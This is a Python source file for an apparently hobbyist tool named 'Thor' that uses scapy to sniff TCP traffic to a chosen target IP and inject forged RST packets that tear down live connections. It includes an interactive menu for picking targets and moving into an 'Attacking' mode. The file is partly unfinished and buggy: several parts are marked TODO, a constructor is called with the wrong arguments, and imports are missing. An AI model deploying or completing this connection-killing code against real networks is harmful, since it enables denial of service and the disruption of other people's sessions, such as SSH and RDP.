from scapy.all import *
from multiprocessing import Process, Queue, Manager, Lock, Value
import time
import hashlib
import logging
import datetime
from termcolor import colored
import argparse



import select



class sniffer(Process):
    def __init__(self, lock):
        super(sniffer, self).__init__()
        self.p_instance = ProcessConn(lock)


    def run(self):
        sniff(filter='tcp', prn=self.p_instance.add)
        #sniff(filter='tcp port 22 or tcp port 3389', prn=self.p_instance.add)

class PicklablePacket:
    """A container for scapy packets that can be pickled (in contrast
    to scapy packets themselves)."""
    def __init__(self, pkt):
        self.contents = bytes(pkt)
        self.time = pkt.time

    def __call__(self):
        """Get the original scapy packet."""
        pkt = Ether(self.contents)
        pkt.time = self.time
        return pkt


class ProcessConn():
    def __init__(self, lock):
        self.db = Manager().dict()
        self.lock = lock

    class Object():
        '''
                    four_tuple  : str   String of four tuple
                    hash        : str   Hash String 512bits
                    pkt         : obj   Scapy Packet
                    packets     : int   Packet counter
                    server      : bool  Is server
        '''
        def __init__(self):
            self.four_tuple = str()
            self.hash = str()
            self.last_seen = str()
            self.packets = 1
            self.pkt = None
            self.dport = None
            self.sport = None


    def add(self, pkt):
        try:
            # Get Lock
            self.lock.acquire()

            # Create new object
            conn = self.Object()

            # Extract the 4 tuple
            self.extract_four_tuple(conn, pkt)

            # Hash it
            self.hash(conn)

            # Check the packet to see if its a RST or FIN
            self.state(conn, pkt)

            # Check the db True if added or already in, False if removed
            if self.check_exists(conn):

                # Add Packet
                conn.pkt = PicklablePacket(pkt)

                # Update counter
                self.packet_counter(conn)

                # Save
                self.db[conn.hash] = conn

            # Finally
            self.lock.release()

        except Exception as e:
            return logger.debug(e)


    def extract_four_tuple(self, conn, pkt):
        if pkt.haslayer(TCP):
            conn.src = pkt[IP].src
            conn.dst = pkt[IP].dst
            conn.sport = str(pkt[TCP].sport)
            conn.dport = str(pkt[TCP].dport)
            if conn.sport < conn.dport:
                conn.four_tuple = " ".join((conn.src, conn.sport, conn.dst, conn.dport))
            else:
                conn.four_tuple = " ".join((conn.dst, conn.dport, conn.src, conn.sport))
            logger.debug('Incoming connection: {}'.format(conn.four_tuple))
        else:
            raise 'LayerError'


    def hash(self, object):
        try:
            object.hash = hashlib.sha512(bytes(object.four_tuple, 'utf-8')).hexdigest()
        except Exception as e:
            print(e)
            print('[!] Hash error while trying', object.four_tuple)


    def state(self, conn, pkt):
        if pkt[TCP].flags in (0x0004, 0x0011, 0x0001, 0x00e):
            logger.debug(pkt[TCP].flags)
            conn.end = True
        else:
            logger.debug(pkt[TCP].flags)
            conn.end = False


    def check_exists(self, conn):
        if conn.hash in self.db:
            if conn.end == False:
                conn.last_seen = datetime.datetime.now()
                logger.debug('Conn exists: {}..'.format(conn.hash[:16]))
                return True
            else:
                del self.db[conn.hash]
                logger.debug('Removed conn: {}..'.format(conn.hash[:16]))
                return False
        else:
            conn.last_seen = datetime.datetime.now()
            #self.db[conn.hash] = conn
            logger.debug('Conn added: {}..'.format(conn.hash[:16]))
            return True


    def packet_counter(self, conn):
        try:
            conn.packets = self.db[conn.hash].packets + 1
        except:
            conn.packets = 1


# This is all TODO
class kill(Process):
    def __init__(self, que, lock):
        super(kill, self).__init__()
        self.que = que
        self.quelen = 0
        self.lock = lock
        self.look_for = False
        self.connection_alive = True
        self.que_wait_timeout = 0
        self.mode = None


    def run(self):
        self.que_control(self.lock)
        # print(self.pkt[TCP].seq, self.pkt[TCP].ack)
        # ft = " ".join(('ip host', self.pkt[IP].src, 'or',  self.pkt[IP].dst,
        #                'and port', str(self.pkt[TCP].sport), 'or', str(self.pkt[TCP].dport)))
        # sniff(filter=ft, prn=self.kill)

    def add(self, pkt):
        #logger.debug('Packet Recieved')
        self.que.put(PicklablePacket(pkt))


    def kill(self, pkt):
        # Check if its ours
        #print(self.last_packet == pkt)

        # If we were waiting for this, it's over
        if self.look_for == (pkt[IP].dst, pkt[TCP].dport, pkt[TCP].flags):
            logger.debug('Connection Dead: Acknowledgment reset seen')
            #print(pkt.show2())
            self.look_for = None

        #if self.last_packet == pkt:
         #   return

        # Setup the values
        self.flip(pkt)

        # send fin/rst with new checksum
        srp1(self.ready_packet, iface = 'eth1', timeout =1, verbose=False)

    def flip(self, pkt):

        # Universal packet info
        self.ready_packet = copy.copy(pkt)

        # del IP checksum
        del self.ready_packet.chksum

        # del TCP checksum
        del self.ready_packet[TCP].chksum

        # Delete the ack flag
        del self.ready_packet[TCP].ack

        # Increment ID
        self.ready_packet[IP].id += 1

        # set the reset flag
        self.ready_packet[TCP].flags = 0x0004

        # Set the packet reply we are looking for
        self.look_for = (pkt[IP].dst, pkt[TCP].dport, 0x0004)


    def que_control(self, lock):
        while True:
            # get que length
            self.quelen = self.que.qsize()

            #logger.debug('checking')
            # wait so we don't respond to every single packet
            time.sleep(0.2)

            # check the saved que length vs current que length and
            # every 2 seconds to see if the stream is very fast
            if self.quelen < self.que.qsize() and self.que_wait_timeout < 10:
                self.que_wait_timeout +=1


            # things in que, but same size or timeout reached
            elif not self.que.empty():
                logger.debug('Connection que size is currently: ' + str(self.que.qsize()))

                # Acquire lock to stop more packets adding, including what we send
                self.lock.acquire()

                # # fast stream
                if self.que_wait_timeout >= 10:
                    logger.debug('Timeout Exceeded')
                #     # some kill function that gets the average seq
                #     pass

                # Get the last item
                useable_pkt = None
                while not self.que.empty():

                    # get and unpickle packet
                    useable_pkt = self.que.get()()

                # go get it
                print(self.que.empty())
                self.kill(useable_pkt)
                self.lock.release()



class printer():
    def __init__(self):

        # Modes: 0 = Collecting, 1 = Selecting, 2 = Attacking
        self.modes = {0: 'Collecting', 1: 'Selecting', 2: 'Attacking'}
        self.mode = 0
        self.target = None
        self.banner = '''
 _______ _     _  _____   ______
    |    |_____| |     | |_____/
    |    |     | |_____| |    \___
                                '''
        pass

    def menu(self, ndata, lock):
        while True:

            # # Throws broken pipe if not
            try:
                lock.acquire()
                data = copy.deepcopy(ndata)
            except BrokenPipeError:
                pass
            except ConnectionResetError:
                pass

            lock.release()
            self.print_it(data)

            if self.mode == 0:
                try:
                    time.sleep(1)
                except KeyboardInterrupt:
                    self.mode = 1

            elif self.mode == 1:
                try:
                    x = (input('Please select a target: '))
                    for num,hash in enumerate(data):
                        if num == int(x):
                            self.target = hash
                            break

                    if not isinstance(self.target, str):
                        print(colored('[!] Invalid Target Choice, Try Again', 'red'))
                    else:
                        print(colored('[!] Targeting: {}', 'red').format(self.target))
                        self.mode = 2

                    time.sleep(1)

                except KeyboardInterrupt:
                    return

            else:
                try:
                    time.sleep(5)
                except KeyboardInterrupt:
                    break

    def print_it(self, dict):
        if not no_print:
            # Clear the screen whenever we print
            os.system('clear')

        # Terminal size 0 is rows, 1 is columns
        try:
            columns = int(os.popen('stty size', 'r').read().split()[1])
        except:
            columns = 50

        # Print the Banner
        # for bannerline in self.banner.splitlines():
        #     print(colored('{} {}', 'green').format(' ' * (round(columns / 2 - 35)), bannerline))

        # Print the info summary
        print('#' * columns)
        print(colored('CURRENT STATUS: {} {}', 'blue').format(self.modes[self.mode], '[CTRL-C TO STOP]'))
        print('#' * columns)

        if self.mode in (0,1):
            print(colored('{:^5} {:20} {:25} {:25} {:20} {:20} ', 'blue')
                  .format('#', 'CONNECTION HASH', 'SRC:', 'DST:', 'PACKETS:', 'FIRST SEEN:'))
            for x,i in enumerate(dict.values()):
                print(colored('[{:^3}] {:25} {:25} {:20} {:^20} {:20} ', 'red')
                      .format(x, i.hash[:16], ':'.join([i.src, i.sport]), ':'.join([i.dst, i.dport]),
                              i.packets, round((datetime.datetime.now() - i.last_seen ).total_seconds())))
        else:
            print(colored('{:^5} {:20} {:25} {:25} {:20} {:20} ', 'blue')
                  .format('#', 'CONNECTION HASH', 'SRC:', 'DST:', 'PACKETS:', 'LAST SEEN:'))
            for x, i in enumerate(dict.values()):
                if i.hash == self.target:
                    print(colored('[{:^3}] {:25} {:25} {:20} {:^20} {:20} ', 'red')
                          .format(x, i.hash[:16], ':'.join([i.src, i.sport]), ':'.join([i.dst, i.dport]),
                                  i.packets, round((datetime.datetime.now() - i.last_seen).total_seconds())))


                    # Check if it is still pickled, if so, pkt() returns the original packet object
                    if type(i.pkt) == PicklablePacket:
                        dict[i.hash].pkt = i.pkt()

                        #  We call the killer class and the kill function with pkt().

                        # TODO
                        killer = kill(i.pkt)
                        killer.daemon = True
                        killer.start()
                        print('Soon to kill connections from both sides')


def parse():
    parser = argparse.ArgumentParser(description='Thor: Killing conns since 2016')
    parser.add_argument('-t', dest='targetip', type=str, required=True, metavar='192.168.1.1',
                        help='The target server.')
    parser.add_argument('-s', dest='targetport', type=int, required=True, metavar=22,
                        help='The target port.')
    parser.add_argument('-v', dest='verbosity', type=str, required=False, metavar='v, vv', default='v',
                        choices=['v', 'vv'], help='The verbosity level')
    return parser.parse_args()


if __name__ == "__main__":

    #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.basicConfig(format='%(levelname)s : %(asctime)s - %(message)s')
    logging.basicConfig(datefmt='%I:%M%S')
    logging.basicConfig(level=logging.DEBUG)
    logger = logging.getLogger(__name__)

    # Get cmd options
    args = parse()

    if args.verbosity == 'v':
        logger.setLevel(logging.INFO)

    elif args.verbosity == 'vv':
        logger.setLevel(logging.DEBUG)

    # create filter from args
    #filter = ' '.join(('ip host', args.targetip, 'and tcp port', str(args.targetport)))

    filter = ' '.join(('ip host', args.targetip))
    # Initialise the que
    que = Queue()
    lock = Lock()

    # add que to the threaded class instance
    killer = kill(que, lock)
    # killer.daemon = True

    # Start the instance
    killer.start()

    # check for traffic and add to que to kill
    sniff(filter=filter, prn = killer.add)

    # lock = Lock()
    # engine = sniffer(lock)
    # engine.daemon = True
    # engine.start()
    #
    # d = printer()
    # data = engine.p_instance.db
    #
    # d.menu(data, lock)
